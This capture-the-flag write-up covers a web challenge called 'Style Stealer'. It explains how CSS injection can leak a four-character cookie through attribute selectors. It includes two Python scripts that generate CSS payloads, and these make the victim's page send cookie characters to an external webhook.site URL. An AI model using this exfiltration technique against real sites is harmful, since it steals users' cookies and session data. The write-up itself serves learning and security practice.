# Style Stealer (web) from Cyber Academy Spring 2024

Our goal is to leak the 4 character cookie from the webpage by using CSS injection.

When we open the URL, we see a text box that allows us to input CSS code, such as specifying the background of the webpage.

To carry out a CSS injection to leak a 1 character cookie, we would use the following code:
```
import string

alpha = string.ascii_lowercase
hook = "https://webhook.site/e169faa3-7516-48e8-a3fa-c30cb0568140"

css = []
for ch in alpha:
    css.append(f'[value="{ch}"] {{ background: url({hook}/?c={ch}); }}')

print("".join(css))
```

The idea is that the background we specify is only used if the value really does equal the specified ch. Our background
doesn't actually set the background to anything. Instead, the webpage visits the URL in an attempt to get the source
for the background. Webhook is a site that will let us know the requests sent to that site. This means that if we have the
ch be equal to 'd' and our webhook receives a GET request with the webhookurl with ?c=d at the end, we know that the cookie
value is d.

The 4 character cookie is a bit more difficult because we need to specify different variables for the different characters.
We set s-1 to be the first character, s-2 as the second character, and s-3 at the final pair for the third and fourth 
characters. If we tried to do it all in one massive for loop where the ch is equal to a string of 4 characters, it would
probably work, but the input would be way to big, since it would be 26^4, which is obviously a very big number.

The final solve script for our input is the following:
```
import string

alpha = string.ascii_lowercase
hook = "https://webhook.site/e169faa3-7516-48e8-a3fa-c30cb0568140"

css = []
css.append("input { background: var(--s-1), var(--s-2), var(--s-3); }")

for i in alpha:
    for j in alpha:
        ch = i + j
        css.append(f'[value^="{ch}"] {{ --s-1: url({hook}/s?c={ch}); }}')
        
for i in alpha:
        ch = i
        css.append(f'[value*="{ch}"] {{ --s-2: url({hook}/m?c={ch}); }}')

for i in alpha:
    for j in alpha:
        ch = i + j
        css.append(f'[value$="{ch}"] {{ --s-3: url({hook}/e?c={ch}); }}')

print("".join(css))
```
